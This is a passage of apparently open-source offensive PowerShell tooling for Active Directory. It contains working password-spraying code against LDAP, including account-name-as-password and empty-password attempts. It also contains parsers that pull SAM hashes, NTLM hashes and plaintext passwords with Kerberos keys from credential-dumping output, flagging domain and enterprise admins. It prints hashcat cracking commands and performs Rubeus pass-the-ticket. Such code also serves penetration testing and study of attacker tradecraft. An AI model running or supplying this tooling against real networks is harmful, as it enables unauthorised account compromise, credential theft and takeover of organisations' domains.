                "$Domain\${UserToSpray}:$Hash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
        }
    }

    # Password Spraying
   if ($Password -ne ""){

        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}:$password" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
        }
    
}


    # Account as password
    if ($AccountAsPassword){

        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$UserToSpray)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
        }
    
}


    # EmptyPasswords
    if ($EmptyPassword){
    $password = ""
       
        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            }
        }
    }
}

################################################################################################################
################################################## Function: SAM ###############################################
################################################################################################################
function SAM {
    if ($Module -eq "SAM" -and $Option -eq "Parse") {
        $SamFull = Test-Path -Path "$PME\SAM\.Sam-Full.txt"
        if (-not $SamFull) {
            New-Item -Path "$PME\SAM\" -Name ".Sam-Full.txt" -ItemType "File" | Out-Null
        }

        Write-Host
        Write-Host
        Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
        Write-Host

        $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
        $lines = @{}

        foreach ($file in $files) {
            $fileLines = Get-Content $file

            foreach ($line in $fileLines) {
                if ([string]::IsNullOrWhiteSpace($line)) {
                    continue
                }

                $lineParts = $line -split ':'
                $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
                $computer = $file.BaseName -split '\.' | Select-Object -First 1
                $computerFormed = "{0}" -f $computer

                if ($lines.ContainsKey($lineWithoutNumber)) {
                    $lines[$lineWithoutNumber] += "," + $computerFormed
                } else {
                    $lines[$lineWithoutNumber] = $computerFormed
                }
            }
        }

        $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
        if ($duplicateLines) {
            foreach ($duplicate in $duplicateLines) {
                $line = $duplicate.Key
                $computers = $duplicate.Value -split ','
                Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
                Write-Host "$line::"
                Write-Host
            }
        }

        Write-Host
        Write-Host "------------------------------ All collected SAM Hashes (Unique) -------------------------------" -ForegroundColor "Yellow"
        Write-Host

        Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
            $Computer = $_.BaseName -split '\.' | Select-Object -First 1
            $ComputerFormed = "[{0}]" -f $Computer
            $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
            $content = Get-Content $_.FullName -Verbose
            $output = foreach ($line in $content) {
                $trimmedLine = $line.Trim()
                if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt $ComputerFormed.Length) {
                    $ComputerFormed + $trimmedLine
                }
            }
            $output | Out-File "$SAM\.Sam-Full.txt" -Force "ascii" -Append
        }

        Start-Sleep -Seconds "3"
        (Get-Content "$SAM\.Sam-Full.txt") | Sort-Object -Unique | Sort | Out-File "$SAM\.Sam-Full.txt" -Encoding "ASCII"
        Get-Content "$SAM\.Sam-Full.txt"

        Write-Host ""
        Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
        Write-Host ""
        Write-Host "All SAM hashes written to $PME\SAM\.Sam-Full.txt" -ForegroundColor "Yellow"
        Write-Host ""
    }
}

################################################################################################################
################################################# Function: Parse-LogonPassword ################################
################################################################################################################
Function Parse-LogonPasswords{
if ($Module -eq "LogonPasswords" -and $Option -eq "Parse"){
Write-Host
Write-Host
# Set the path to the LogonPasswords output file
$LogonPasswordsOutputDirectory = "$LogonPasswords\"
$Files = Get-ChildItem -Path $LogonPasswordsOutputDirectory -File -Filter "*RAW.txt" | Where-Object { $_.Length -gt 0 }
foreach ($File in $Files){

    # Read the LogonPasswords output file
    $LogonPasswordsOutput = Get-Content $File.FullName

    # Extract the information for each occurrence of "[00000003] Primary"
    $Results = $LogonPasswordsOutput | Select-String "\[00000003\] Primary" -Context 0,4| ForEach-Object {
        $Output = $_.Context.PostContext

        # Extract the values for Username, Domain, and NTLM
        $Username = $output[0] -replace "^\s+\*\sUsername\s+:\s"
        #$Domain = $output[1] -replace "^\s+\*\sDomain\s+:\s"
        $NTLM = $output[2] -replace "^\s+\*\sNTLM\s+:\s"

        # Create a new object with the extracted values
        [PSCustomObject]@{
            Username = $Username
            NTLM = $NTLM
            #Domain = $Domain
        } 
    }

    # Sort the results by username and remove duplicates
    $UniqueResults = $Results | Sort-Object -Property "Username" -Unique | Format-Table -Property Username, NTLM, Domain, Password -HideTableHeaders

    if ($UniqueResults) {
        $FileToSplit = "$File.Name"
        $filenameWithoutExtension = $FileToSplit.Split(".")[0]
        Write-Host "$filenameWithoutExtension" -ForegroundColor "Yellow"

        # Format the output as a table and display it
        $FilePath = $LogonPasswordsOutputDirectory + "Hashes-" + "$File.Name" + ".txt"
        $FormattedResults = $UniqueResults | Format-Table -AutoSize | Out-String -Width "1024"

        # Remove empty lines from the formatted results
        $FilteredResults = $FormattedResults -split '\r?\n' | Where-Object { $_.Trim() -ne '' } | Out-String

        # Write the filtered results to a file
        Set-Content -Path $FilePath -Value $FilteredResults
        Get-content -Path $FilePath

    }
}

Get-ChildItem -Path $LogonPasswordsOutputDirectory -Filter "Hashes*" | ForEach-Object { Get-Content $_.FullName | Out-File -FilePath "$PME\LogonPasswords\.All-Unique-NTLM.txt" -Encoding "ASCII" -Append -NoClobber}

# Read the content of the file and filter out empty lines
$RemoveEmpty = Get-Content "$PME\LogonPasswords\.All-Unique-NTLM.txt" | Where-Object { $_ -match '\S' }
Set-Content "$LogonPasswords\.All-Unique-NTLM.txt" -Value $RemoveEmpty

$RemoveColon = Get-Content "$PME\LogonPasswords\.All-Unique-NTLM.txt" | Where-Object { $_ -match '\S' }
Set-Content "$LogonPasswords\.All-Unique-NTLM.txt" -Value $RemoveEmpty

# Read the content of the file convert spaces to ":"
$RemoveSpaces = Get-Content "$PME\LogonPasswords\.All-Unique-NTLM.txt" | Select-String '\s+' | ForEach-Object {$_.Line -replace '\s+', ':'} | Out-String
Set-Content "$LogonPasswords\.All-Unique-NTLM.txt" -Value $RemoveSpaces

# Remove the colon at the end of each line
$GetLines = Get-Content -Path "$LogonPasswords\.All-Unique-NTLM.txt"
# Replace the ":" only at the end of each line
$UpdatedlLines = $GetLines -replace '(?<=.)\:$'
# Write the updated lines back to the file
$UpdatedlLines | Set-Content -Path "$LogonPasswords\.All-Unique-NTLM.txt"

# Print unique NTLM hashes within the banner
Write-Host
Write-Host "-------------------------------------- All collected NTLM Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
Get-Content  -path "$LogonPasswords\.All-Unique-NTLM.txt" | Sort-Object -Unique | Format-Table -AutoSize
Write-Host
Write-Host "----------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
Write-Host 
Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
    
    }
}

################################################################################################################
################################################# Function: Parse-eKeys ########################################
################################################################################################################
Function Parse-eKeys {


    if ($Module -eq "eKeys" -and $Option -eq "Parse") {
    Write-Host
    Write-Host
    Write-Host "Parsing Results" -ForegroundColor "Yellow"
    Write-Host
    Start-Sleep -Seconds "5"
        $outputFilePath = "$ekeys\.eKeys-Parsed.txt"

        Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" |  Where-Object { $_.Length -gt 0 } | ForEach-Object {
            $Computer = $_.BaseName -split '\.' | Select-Object -First 1
            $ComputerFormed = "{0}" -f $Computer
            Write-Host $ComputerFormed -ForegroundColor Yellow

            $filePath = $_.FullName
            $fileContent = Get-Content -Path $filePath -Raw

            $pattern = '(?ms)\s\*\sUsername\s:\s(.+?)\s*\r?\n\s*\*\s+Domain\s+:\s(.+?)\s*\r?\n\s*\*\s+Password\s:\s(.+?)\s*\r?\n\s*\*\s+Key List\s:\s(.*?)(?=\r?\n\s\*\sUsername\s:|\r?\n\r?\n)'
            $matches = [regex]::Matches($fileContent, $pattern)

            $uniqueGroups = @{}

            foreach ($match in $matches) {
                $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'
                $groupKey = "$username-$domain"

                if (!$uniqueGroups.ContainsKey($groupKey)) {
                    $group = [PSCustomObject]@{
                        Username = $username
                        Domain = $domain
                        Password = $password
                        KeyList = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
                    }
                    $uniqueGroups[$groupKey] = $group

                    Write-Host "Username   : " -NoNewline
                    Write-Host $username  -NoNewline

                    if ($DomainAdmins -contains $username) {
                        Write-Host " [Domain Admin]" -ForegroundColor "Yellow" -NoNewline
                    }

                    if ($EnterpriseAdmins -contains $username) {
                        Write-Host " [Enterprise Admin]" -ForegroundColor "Yellow" -NoNewline
                    }

                    if ($ServerOperators -contains $username) {
                        Write-Host " [Server Operator]" -ForegroundColor "Yellow" -NoNewline
                    }

                    if ($AccountOperators -contains $username) {
                        Write-Host " [Account Operator]" -ForegroundColor "Yellow" -NoNewline
                    }

                    Write-Host ""
                    Write-Host "Domain     : $domain"
                    Write-Host "Password   : $password"

                    foreach ($key in $group.KeyList) {
                        if (![string]::IsNullOrWhiteSpace($key)) {
                            $keyParts = $key -split '\s+'
                            Write-Host "$($keyParts[0]): $($keyParts[1])"
                        }
                    }

                    Write-Host ""
                }
            }
        }
    }
}

################################################################################################################
################################################# Function: RestoreTicket ######################################
################################################################################################################
Function RestoreTicket{
if (!$CurrentUser) {
    if ($Method -ne "GenRelayList"){
    klist purge | Out-Null
    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
        
        }
    }
}

################################################################################################################
################################################ Execute defined functions #####################################
################################################################################################################

switch ($Method) {
        "WinRM" {Method-WinRM}
        "MSSQL" {Method-MSSQL}
        "SMB" {Method-SMB}
        "WMI" {Method-WMIexec}
        "RDP" {Method-RDP}
        "GenRelayList" {GenRelayList}
        "SessionHunter" {SessionHunter}
        "Spray" {Spray}
        default {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Invalid Method specified"
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Specify either WMI, WinRM, MSSQL, SMB, RDP, Spray, GenRelayList, SessionHunter"
        return
      }
 }

SAM
Parse-eKeys
Parse-LogonPasswords
RestoreTicket

Write-Host ""
$Time = (Get-Date).ToString("HH:mm:ss")
Write-Host "Script Completed : $Time"
$elapsedTime = (Get-Date) - $startTime

# Format the elapsed time
$elapsedHours = "{0:D2}" -f $elapsedTime.Hours
$elapsedMinutes = "{0:D2}" -f $elapsedTime.Minutes
$elapsedSeconds = "{0:D2}" -f $elapsedTime.Seconds
$elapsedMilliseconds = "{0:D4}" -f $elapsedTime.Milliseconds

# Display the formatted elapsed time
$elapsedTimeFormatted = "$elapsedHours h:$elapsedMinutes m:$elapsedSeconds s:$elapsedMilliseconds mi"
Write-Host "Elapsed Time     : $elapsedTime"
Get-Variable | Remove-Variable -ErrorAction SilentlyContinue

}
